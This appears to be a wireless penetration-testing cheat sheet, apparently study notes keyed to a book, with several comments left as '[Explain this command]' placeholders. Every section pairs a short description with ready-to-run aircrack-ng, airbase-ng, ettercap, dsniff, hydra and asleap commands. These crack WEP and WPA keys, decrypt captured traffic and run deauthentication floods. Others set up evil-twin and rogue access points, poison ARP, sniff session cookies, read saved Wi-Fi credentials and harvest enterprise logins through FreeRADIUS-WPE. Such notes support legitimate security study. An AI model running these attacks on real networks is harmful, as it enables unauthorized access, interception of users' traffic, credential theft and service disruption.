# Encryption Flaws

## Cracking WEP (p74)
Cracking WEP involves capturing sufficient encrypted packets over the air and analyzing them to recover the static WEP key. This technique should be used in legacy environments where WEP is still in use, often due to outdated hardware or misconfigured networks. It relies on the predictability and reuse of Initialization Vectors (IVs), which, once collected in large enough quantities, can be processed by tools like aircrack-ng to reveal the key. The attack is effective because WEP’s design flaws allow attackers to decrypt traffic and gain full access to the network with minimal effort.

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
airodump-ng -c [channel] --bssid [target MAC] -w wepcrack mon0  # [Explain this command]
aireplay-ng -3 -b [target MAC] -h [your MAC] mon0  # [Explain this command]
aircrack-ng wepcrack-01.cap  # [Explain this command]

```
## Cracking WPA-PSK Weak Passphrase (p85)
This technique captures the WPA/WPA2 four-way handshake during a client’s authentication and then performs an offline dictionary or brute-force attack to guess the passphrase. It is most effective when the network uses a weak or commonly used PSK and can be tested without further interaction with the access point. Ideal in environments where you can force a re-authentication via de-authentication attacks, it is a go-to method for evaluating the strength of wireless passphrases. Its success depends entirely on the quality of the wordlist and the weakness of the chosen password.

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
airodump-ng --bssid [target MAC] -c [channel] -w wpacrack mon0  # [Explain this command]
aireplay-ng --deauth 10 -a [target MAC] -c [client MAC] mon0  # [Explain this command]
aircrack-ng -w /path/to/wordlist.txt -b [target MAC] wpacrack-01.cap  # [Explain this command]

```
## Decrypting WEP and WPA Packets (p94)
Decrypting wireless packets allows an attacker to inspect the contents of traffic, once the encryption key has been recovered through cracking. This technique is used after a successful WEP or WPA handshake capture and crack to passively monitor or analyze all client and AP communications. It’s useful for post-exploitation surveillance, understanding network behavior, or extracting sensitive information. The attack is effective because it transforms otherwise unreadable packet data into intelligible network traffic, revealing everything from plaintext credentials to browsing habits.

```
# WEP
airdecap-ng -w [WEP key] wepcrack-01.cap
# WPA
airdecap-ng -e [ESSID] -p [passphrase] wpacrack-01.cap
```

## Connecting to WEP Network (p96)
Connecting to a WEP-protected network involves using a recovered WEP key to authenticate and gain legitimate access. This action is taken post-exploitation and is useful for deeper network enumeration, launching internal attacks, or demonstrating full compromise during an assessment. Once connected, the attacker can use the network like any other client, including accessing shared resources or performing lateral movement. The technique is effective because WEP offers no protection once the static key is known, allowing for seamless infiltration.

```bash
ifconfig wlan0 down  # [Explain this command]
iwconfig wlan0 essid [network name]
iwconfig wlan0 key s:[WEP key]
ifconfig wlan0 up  # [Explain this command]
dhclient wlan0

```
## Connecting to WPA Network (p97)
This technique involves joining a WPA/WPA2 network using a cracked PSK obtained through handshake capture and offline brute-force or dictionary attacks. It is typically employed after successful credential recovery and serves as a stepping stone for post-authentication reconnaissance or pivoting into other parts of the network. Once connected, the attacker is indistinguishable from a legitimate client, enabling full access to internal services and hosts. Its power lies in demonstrating the real-world impact of using weak or guessable WPA passphrases.

```bash
wpa_passphrase [network name] [passphrase] > wpa.conf  # [Explain this command]
wpa_supplicant -B -Dwext -i wlan0 -c wpa.conf  # [Explain this command]
dhclient wlan0
```

---

# Attacks On Wlan 

## Cracking Default Accounts on the Access Points
This attack targets poorly secured or unconfigured access points that still use factory-default usernames and passwords for administrative interfaces. It is best used during post-association enumeration or from a wired segment when an attacker wants to pivot or fully take control of the wireless infrastructure. Once access is gained, the attacker can alter settings, create backdoors, or disable security entirely. It is effective because many consumer and even enterprise APs are shipped with known credentials, and users often fail to change them, making this a low-effort, high-impact technique.
```
map -p 80 --script http-default-accounts [router IP]
hydra -l admin -P /usr/share/wordlists/rockyou.txt [router IP] http-get /
```

## Deauthentication DoS Attack
The Deauthentication Denial-of-Service (DoS) attack involves continuously sending spoofed de-authentication frames to clients, severing their connection to the wireless network. It is most useful during active red team operations or assessments where disruption is the goal, or when trying to isolate a device or capture handshakes. The attack is effective due to the unauthenticated nature of management frames in Wi-Fi standards, making it simple to execute and nearly impossible for clients to defend against without additional protections like 802.11w.

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
aireplay-ng --deauth 1000 -a [target AP MAC] mon0  # [Explain this command]

```
## Evil Twin with MAC Spoofing
The Evil Twin with MAC Spoofing attack involves setting up a rogue access point that not only mimics the SSID of a legitimate network but also clones its MAC address to increase believability. This technique is particularly useful when attempting to impersonate an enterprise or captive portal network where MAC address filtering is in place or clients expect a specific BSSID. It is effective because it enhances the likelihood that client devices will auto-connect, especially when the real AP is jammed or otherwise inaccessible, enabling seamless credential harvesting or man-in-the-middle attacks.

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
macchanger --mac [spoofed MAC] wlan0
airbase-ng -e [ESSID] -c [channel] -a [spoofed MAC] mon0  
ifconfig at0 up  # [Explain this command]
dhcpd at0  # [Explain this command]
ifconfig at0 192.168.10.1 netmask 255.255.255.0  
iptables --flush  # [Explain this command]
iptables --table nat --flush  # [Explain this command]
iptables --delete-chain  # [Explain this command]
iptables --table nat --delete-chain  # [Explain this command]
iptables -P FORWARD ACCEPT  # [Explain this command]
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
echo 1 > /proc/sys/net/ipv4/ip_forward  # [Explain this command]

```
## Rogue Access Point
A Rogue Access Point attack sets up an unauthorized AP within the target network's range, either to entice users to connect or to bypass network controls from within a trusted zone. This attack is ideal for persistent network intrusion, lateral movement, or testing physical security controls and wireless access policies. It is effective because many networks do not actively scan for unauthorized APs, and users can be easily lured to connect if the rogue AP is stronger or more familiar than the legitimate one. Once connected, attackers can capture data, redirect traffic, or inject malicious content.

```bash
airmon-ng start wlan0  # [Explain this command]
airbase-ng -e RogueAP -c [channel] mon0  # [Explain this command]
ifconfig at0 up  # [Explain this command]
dhclient at0
```

---

# Attacking The Client

## Mis-Association Attack (Honeypot)
The Mis-Association attack, also known as the Honeypot attack, involves setting up a rogue access point broadcasting a familiar or attractive SSID to trick nearby clients into connecting. This attack is best used during assessments of environments where users are likely to connect automatically to open or previously known networks, such as airports, cafes, or enterprise campuses. It is effective because many wireless devices will automatically connect to any network broadcasting a known SSID, allowing attackers to intercept sensitive traffic, redirect victims, or launch man-in-the-middle attacks without needing to breach existing network infrastructure.

```bash
airmon-ng start wlan0  # 
airbase-ng -P -C 30 -e "Free Public WiFi" -c [channel] mon0  # 
ifconfig at0 up  # 
dhclient at0

```
## Caffe Latte Attack (Client WEP Key Retrieval)
The Caffe Latte attack targets clients with saved WEP keys by tricking them into leaking enough encrypted packets to allow for offline key recovery. This attack is particularly useful when the access point is not physically reachable or is hardened against direct attacks, but mobile clients are within range. It works by simulating an AP and inducing the client to generate ARP traffic, which the attacker collects and analyzes to recover the WEP key. Its effectiveness lies in the ability to extract encryption credentials from the client alone, making it a stealthy alternative to traditional AP-focused attacks.
```bash
airmon-ng start wlan0  # 
airbase-ng -e "test" -c [channel] -W 1 -Z 4 mon0  # 
airodump-ng -c [channel] --bssid [spoofed MAC] -w lattekill mon0  # 

```
## De-Authenticating the Client
De-Authentication attacks disrupt client connections by spoofing de-authentication frames from the access point, forcing a client to disconnect. This technique is commonly used when attempting to capture WPA/WPA2 handshakes for offline cracking or to force clients to reconnect to a rogue access point. It is effective because most wireless clients automatically attempt to reconnect after disconnection, providing attackers with repeated opportunities to intercept handshakes, test client behavior, or mount further impersonation attacks. The attack is simple and devastating due to the unauthenticated nature of management frames in many Wi-Fi protocols.
```bash
airmon-ng start wlan0  # 
airodump-ng mon0  # 
aireplay-ng --deauth 5 -a [AP MAC] -c [client MAC] mon0  # 


```
## Cracking WEP with Hirte
The Hirte attack enables WEP key recovery by exploiting a client’s responses to fragmented or replayed packets, even without an active access point. It is most useful in scenarios where a WEP network’s access point is unreachable but a previously connected client is nearby. By injecting specially crafted packets and harvesting the client's responses, an attacker can gather enough data to crack the WEP key offline. The attack is effective because it requires only a wireless client, expanding the attacker’s options beyond traditional access point-centric methods and highlighting the fragility of WEP encryption.
```bash
airmon-ng start wlan0  # 
airodump-ng mon0  # 
aireplay-ng --interactive -b [target MAC] -h [your MAC] mon0  # 
aircrack-ng -z -n 64 -b [target MAC] wephirte.cap


```
## AP-less WPA cracking
AP-less WPA cracking simulates a trusted access point to trick wireless clients into initiating a handshake, allowing the attacker to capture the WPA four-way handshake without needing the real access point. This attack is ideal when the attacker cannot disrupt or access the legitimate AP but has physical proximity to clients with stored credentials. It is effective because clients will often attempt to authenticate with any AP broadcasting a known SSID, enabling the attacker to collect authentication data for offline password attacks. This method is particularly powerful against poorly configured WPA networks and weak passphrases.
```bash
airmon-ng start wlan0  # 
airbase-ng -e [target ESSID] -c [channel] -a [target BSSID] -Z 4 mon0  # 
airodump-ng -c [channel] --bssid [target BSSID] -w ap-less mon0  # 
aireplay-ng --deauth 5 -a [target BSSID] -c [client MAC] mon0  # 
aircrack-ng -w /path/to/wordlist.txt ap-less-01.cap
```

---

# Advanced Wlan Techniques

### Man-in-the-Middle attack

Description:
This attack sets up a rogue access point with the same SSID as a legitimate one,
tricking clients into connecting. Once connected, the attacker can intercept, modify,
or redirect traffic. Use during security assessments to evaluate a network's resistance
to rogue APs and traffic interception risks. It demonstrates the risks of trusting
unsecured or spoofed access points and the importance of certificate pinning, VPNs,
and user awareness.

```bash
airmon-ng start wlan0                                                # Enable monitor mode on the wlan0 interface
airbase-ng -e RogueAP -c [channel] mon0                              # Create a fake AP named "RogueAP" on the specified channel
ifconfig at0 up                                                      # Bring up the virtual interface created by airbase-ng
dhcpd at0                                                            # Start DHCP server to assign IPs to clients connecting to at0
ifconfig at0 192.168.1.1 netmask 255.255.255.0                       # Set a static IP on the fake interface
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1      # Route traffic through the fake gateway
echo 1 > /proc/sys/net/ipv4/ip_forward                               # Enable IP forwarding to relay traffic
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE                 # Masquerade traffic from at0 to external network via eth0
ettercap -T -q -i at0 -M arp:remote // //                            # Launch ARP poisoning to intercept and sniff network traffic
```

### Wireless Eavesdropping
This passive attack involves capturing wireless packets in the air for later analysis.
Use during recon or to analyze open or poorly encrypted networks without disrupting them.
It reveals sensitive data or credentials transmitted in plaintext, misconfigured encryption, 
and device behavior.

```bash
airmon-ng start wlan0         # Enable monitor mode on the wireless card
airodump-ng mon0              # View available wireless networks and clients
wireshark &                   # Launch Wireshark for real-time packet capture and analysis

# Then apply display filters like:
# http                     - To view unencrypted web traffic
# tcp.port==80             - To isolate standard HTTP port traffic
# wlan.fc.type_subtype==0x08 - To view Beacon frames


```
### Session Hijacking over Wireless
This attack captures session tokens, cookies, or credentials from unencrypted network traffic to hijack user sessions.
When users connect to insecure networks (e.g., public Wi-Fi), to demonstrate risks of non-HTTPS services.
To stress the importance of HTTPS, secure cookie flags, and encrypted transport layers.

```bash
airmon-ng start wlan0        # Enable monitor mode
airodump-ng mon0             # Discover nearby wireless traffic
driftnet -i mon0             # Intercept and display images being transmitted
dsniff -i mon0               # Capture passwords, session cookies, and credentials from sniffed traffic
urlsnarf -i mon0             # Log all URLs accessed by devices on the network
```

### Enumerating wireless security profiles
This involves identifying saved or auto-connect wireless profiles on a system, including previously 
connected networks and their credentials.  When analyzing client device configurations or performing 
post-exploitation data gathering. It shows what networks a device connects to and can expose credentials 
or hint at physical locations.
```bash
nmcli dev wifi list                                      # List available networks and their security types
cat /etc/NetworkManager/system-connections/*             # Display saved wireless profiles and potential credentials

```

---

# Attacking Wpa And Radius

## Setting up the AP with FreeRadius-WPE
This technique involves deploying a rogue access point in conjunction with a modified FreeRADIUS server (Wireless Pwnage Edition) to intercept enterprise authentication attempts. It is best used when assessing WPA2-Enterprise environments that rely on EAP-based authentication, such as PEAP or EAP-TTLS. By spoofing a legitimate enterprise SSID, the rogue AP can trick clients into connecting and submitting authentication credentials. These credentials, often in the form of MSCHAPv2 challenge-response pairs, can then be captured and cracked offline. This method is effective because many devices will auto-connect to familiar enterprise SSIDs without validating the server certificate, exposing user credentials.

```bash
airmon-ng start wlan0  # [Explain this command]
airbase-ng -e SecureNet -c [channel] mon0  # [Explain this command]
/etc/init.d/freeradius-wpe start
tail -f /var/log/freeradius-wpe.log

```
## Cracking PEAP
PEAP (Protected Extensible Authentication Protocol) can be attacked once a client connects to a rogue AP backed by FreeRADIUS-WPE, revealing MSCHAPv2 challenge-response pairs. This attack is particularly useful in environments where WPA2-Enterprise is deployed but client-side certificate validation is weak or absent. After capturing the MSCHAPv2 handshake, tools like asleap or hashcat can be used to attempt offline password recovery. The effectiveness of this attack stems from widespread misconfigurations in enterprise networks where users unknowingly submit credentials to untrusted servers due to poor client-side validation.

# After capturing the MSCHAPv2 credentials using FreeRADIUS-WPE:
```bash
asleap -C [challenge] -R [response] -W /path/to/wordlist.txt  # [Explain this command]

```
## Cracking EAP-TTLS
The EAP-TTLS attack also leverages a rogue AP and FreeRADIUS-WPE setup to intercept tunneled authentication data, typically in the form of MSCHAPv2 challenge-response pairs. It is especially valuable when EAP-TTLS is deployed in enterprise environments without strict certificate validation. Much like with PEAP, once credentials are captured, they can be subjected to dictionary or brute-force attacks offline. This method is effective because it bypasses the encryption of the tunnel by exploiting trust relationships at the client level, particularly in mobile or BYOD scenarios where security profiles are less tightly managed.

# Extract the tunneled MSCHAPv2 challenge/response from FreeRADIUS-WPE logs
```bash
asleap -C [challenge] -R [response] -W /path/to/wordlist.txt  # [Explain this command]
Note: The cracking process is identical to PEAP once the inner authentication is revealed.
```

---
